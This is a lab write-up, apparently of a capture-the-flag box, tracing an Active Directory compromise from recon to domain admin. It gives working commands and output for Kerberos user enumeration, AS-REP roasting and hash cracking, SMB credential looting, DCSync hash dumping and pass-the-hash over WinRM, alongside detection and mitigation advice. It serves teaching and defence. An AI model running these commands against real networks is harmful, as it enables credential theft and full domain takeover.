---
title: "Active Directory Attack Path Analysis"
description: "A methodical walkthrough of an AD attack chain — from unauthenticated recon to full domain compromise via AS-REP roasting, DCSync, and pass-the-hash."
date: 2026-07-01
author: "w4nn4d13"
category: "Security Research"
tags:
  - active-directory
  - penetration-testing
  - kerberos
  - windows
  - dcsync
hashtags:
  - "#ActiveDirectory"
  - "#PenTest"
  - "#SecurityResearch"
  - "#Windows"
  - "#Kerberos"
featured: true
draft: false
toc: true
cover: "/images/ad-cover.png"
---

> **Disclaimer:** This content is intended **solely for educational purposes and authorized security testing** in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.

## Introduction

Active Directory (AD) remains the dominant identity and access management solution in enterprise environments, making it a primary target during internal penetration tests. A single misconfigured account or overlooked privilege can cascade into full domain compromise. This article presents a methodical AD attack chain from an unauthenticated position to complete control over a Windows domain, explaining the underlying technology, the commands used, and the defensive gaps that enable each phase.

The engagement begins with a single IP address and no credentials. The target is a Windows Domain Controller identified by its open ports and service banners. The scenario mirrors common enterprise misconfigurations: legacy authentication settings, weak service account passwords, improper delegation of replication privileges, and reliance on NTLM pass-the-hash vectors.

## Network Reconnaissance

Every penetration test begins with discovery. The goal of this phase is to identify the target's role, operating system, domain affiliation, and the services it exposes to the network.

```bash
nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sV -T4 <TARGET_IP>
```

This scan targets the standard Active Directory service ports:

- **53/TCP (DNS):** Domain Name Service is integral to AD for locating domain controllers.
- **88/TCP (Kerberos):** The core authentication protocol for AD.
- **389/TCP (LDAP):** The primary query interface for reading and writing to the AD database.
- **445/TCP (SMB):** Frequently abused for enumeration, credential harvesting, and lateral movement.
- **5985/TCP (WinRM):** Provides remote PowerShell and command execution capabilities.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: spookysec.local)
445/tcp   open  microsoft-ds
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

The LDAP banner leaks the domain name (`spookysec.local`).

## Domain Enumeration

With the domain name identified, the next step is to verify domain controller properties via SMB negotiation.

```bash
netexec smb <TARGET_IP>
```

```
SMB  <TARGET_IP>  445  ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64
     (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

**SMB signing** is enabled — NTLM relay attacks against SMB won't work, but Kerberos-based attacks remain available.

## User Enumeration

### Kerberos User Enumeration with Kerbrute

Kerberos returns distinct error codes for existing vs non-existing accounts during AS-REQ:

- **KRB5KDC_ERR_PREAUTH_REQUIRED (0x25):** User exists.
- **KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6):** User does not exist.

```bash
kerbrute userenum -d spookysec.local --dc <TARGET_IP> /wordlists/users.txt
```

```
[+] VALID USERNAME:  james@spookysec.local
[+] VALID USERNAME:  svc-admin@spookysec.local
[+] VALID USERNAME:  robin@spookysec.local
[+] VALID USERNAME:  darkstar@spookysec.local
[+] VALID USERNAME:  administrator@spookysec.local
[+] VALID USERNAME:  backup@spookysec.local
[+] VALID USERNAME:  paradox@spookysec.local
```

![Kerbrute user enumeration output](/images/ad-01.png)

Eight valid domain users identified. `svc-admin` and `backup` stand out as potentially privileged service accounts.

## AS-REP Roasting

### Background

In standard Kerberos, the AS-REQ includes a timestamp encrypted with the user's NTLM hash (pre-authentication). Active Directory allows accounts to be configured with **"Do not require Kerberos pre-authentication"** (`UF_DONT_REQUIRE_PREAUTH`). When this flag is set, the KDC issues an encrypted TGT to **anyone** who requests one — without any proof of password knowledge.

The TGT is encrypted with the user's NTLM hash, making it crackable offline.

### The Attack

```bash
GetNPUsers.py spookysec.local/ -dc-ip <TARGET_IP> -usersfile valid_users.txt -request -format hashcat
```

```
svc-admin@spookysec.local:e2ff9604df420fa561af327bfb1f3540$...
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
```

![AS-REP roasting hash capture](/images/ad-02.png)

Only `svc-admin` has pre-authentication disabled. Cracking with Hashcat mode 18200:

```bash
hashcat -m 18200 hash.txt /wordlists/passwords.txt --force
```

```
svc-admin@spookysec.local:...:management2005
```

**Recovered credential:** `svc-admin:management2005`

![Hashcat cracking the AS-REP hash](/images/ad-03.png)

### Detection & Mitigation

Audit accounts with `DONT_REQUIRE_PREAUTH` using PowerShell:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

Monitor Event ID **4768** for TGT requests where Pre-Authentication field = false.

## SMB Enumeration

With valid credentials, enumerate accessible resources.

```bash
netexec smb <TARGET_IP> -u 'svc-admin' -p 'management2005' --shares
```

```
Share       Permissions
-----       -----------
ADMIN$      (Remote Admin)
backup      READ
IPC$        READ
NETLOGON    READ
SYSVOL      READ
```

![SMB share enumeration](/images/ad-04.png)

The non-default `backup` share is readable. Connecting:

```bash
smbclient //<TARGET_IP>/backup -U 'spookysec.local\svc-admin'
```

Inside: `backup_credentials.txt` (48 bytes) containing a Base64 string.

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoded:

```
backup@spookysec.local:backup2517860
```

![SMB backup share contents](/images/ad-05.png)

Credentials in an accessible SMB share — Base64 encoding provides zero security.

## Privilege Escalation: DCSync

### Background

Domain Controllers replicate via the MS-DRSR (Directory Replication Service) protocol. Two extended rights control this:

- **DS-Replication-Get-Changes**
- **DS-Replication-Get-Changes-All**

An account with these rights can impersonate a DC and request replication of the entire AD database, including all password hashes — the **DCSync** attack.

### Executing DCSync

```bash
netexec smb <TARGET_IP> -u 'backup' -p 'backup2517860' --ntds
```

```
[+] spookysec.local\backup:backup2517860
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::
[+] Dumped 18 NTDS hashes
```

![DCSync dumping NTDS hashes](/images/ad-06.png)

- **Administrator NTLM:** `0e0363213e37b94221497260b0bcb4fc`
- **krbtgt NTLM:** `0e2eb8158c27bed09861033026be4c21`

The krbtgt hash enables **Golden Ticket** attacks.

### Detection

Monitor Event ID **4662** (access to AD object where AccessMask = `DS-Replication-Get-Changes`) and Event IDs **4928/4929** (replication from non-DC source).

### Mitigation

Audit and remove replication permissions from non-DC accounts:

```powershell
Get-ACL "AD:DC=spookysec,DC=local" | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match "Replicating"}
```

## Pass-the-Hash

### Background

NTLM is a challenge-response protocol — **the hash itself is the authentication secret**. If you have the NTLM hash, you can authenticate without the plaintext password.

### Pass-the-Hash via WinRM

```bash
netexec winrm <TARGET_IP> -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -d 'spookysec.local' -X 'whoami'
```

```
WINRM  <TARGET_IP>  5985  [+] spookysec.local\Administrator (Pwn3d!)
thm-ad\administrator
```

![Pass-the-hash WinRM access](/images/ad-07.png)

![Administrator shell confirmed](/images/ad-08.png)

### Mitigation

- **Enable Credential Guard** — isolates NTLM hashes in a virtualized secure enclave.
- **Restrict WinRM access** to designated management hosts.
- **Disable NTLM** where Kerberos-only is feasible.
- **Implement Privileged Access Workstations (PAWs).**

## Detection Opportunities Summary

| Attack Phase | Event ID | Description |
|---|---|---|
| Kerberos User Enumeration | 4768 | Multiple TGT requests with PRINCIPAL_UNKNOWN |
| AS-REP Roasting | 4768 | TGT request for account with pre-auth disabled |
| SMB Share Access | 5140 | Access to non-standard SMB share |
| DCSync | 4662 | Access to domain root with Replicating rights |
| DCSync | 4928/4929 | Replication from non-DC source |
| Pass-the-Hash | 4624 | Network logon (Type 3) via NTLM |

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Active Scanning | T1595.001 | Reconnaissance |
| Domain Account Discovery | T1087.002 | Discovery |
| AS-REP Roasting | T1558.003 | Credential Access |
| OS Credential Dumping: DCSync | T1003.006 | Credential Access |
| Pass-the-Hash | T1550.002 | Lateral Movement |
| Remote Services: WinRM | T1021.006 | Lateral Movement |

## Conclusion

This attack chain demonstrates how a handful of misconfigurations cascade into full domain compromise:

1. **Service account with pre-auth disabled + weak password** → AS-REP roast yields first credential.
2. **Credentials in a readable SMB share** → elevates to privileged backup account.
3. **Excessive replication permissions** → DCSync dumps all domain hashes.
4. **NTLM pass-the-hash via WinRM** → Domain Administrator access.

**DCSync is the crown jewel.** Protecting replication permissions — combined with Credential Guard — provides the highest defensive return.

## References

- Impacket: https://github.com/fortra/impacket
- Kerbrute: https://github.com/ropnop/kerbrute
- NetExec: https://github.com/Pennyw0rth/NetExec
- MITRE ATT&CK: https://attack.mitre.org
